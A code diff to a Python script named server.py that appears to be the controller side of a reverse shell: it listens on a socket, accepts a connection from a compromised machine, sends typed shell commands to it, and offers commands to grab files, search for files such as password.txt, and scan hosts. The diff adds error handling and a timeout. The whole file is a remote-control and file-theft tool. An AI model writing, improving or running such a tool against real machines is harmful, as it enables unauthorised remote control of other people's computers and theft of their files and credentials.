@@ -22,15 +22,20 @@ def help():
     print("\nterminate ----> to close the socket\n")
     print("grab -----> to get a file Eg: grab file.txt\n")
     print("cd ----> to change directory\n")
-    print("search ----> to search for a file with a specified path Eg: search C:\ password.txt\n")
+    print("search ----> to search for a file with a specified path Eg: search C:\temp\ password.txt\n")
     print("scan -----> to scan a host Eg: scan 192.168.0.143:21,22,24,80 etc.\n")
 def connect(ip,port):
-    s=socket.socket()
-    s.bind((str(ip),int(port)))
-    s.listen(1)
-    conn,addr=s.accept()
-    print('[+] we got the connection from',addr)
+    try:
+        s=socket.socket()
+        s.bind((str(ip),int(port)))
+        s.listen(1)
+        conn,addr=s.accept()
+    except Exception as e:
+        print(str(e))
     
+    s.settimeout(20)	
+    print('[+] we got the connection from',addr)
+
     while True:
         command=input('Shell#>')
         if 'terminate' in command:
@@ -44,13 +49,13 @@ def connect(ip,port):
         else:
             conn.send(command.encode())
             print(conn.recv(1024).decode())
-            
-            
+
+
 def main():
     try:
         connect(sys.argv[1],sys.argv[2])
     except KeyboardInterrupt:
         print("[-]closed")
-    except Exception:
-    	print("[-]usage ./server.py <local ip addr> <port>\n")
+    except IndexError:
+        print("[-]usage ./server.py <local ip addr> <port>\n")
 main()
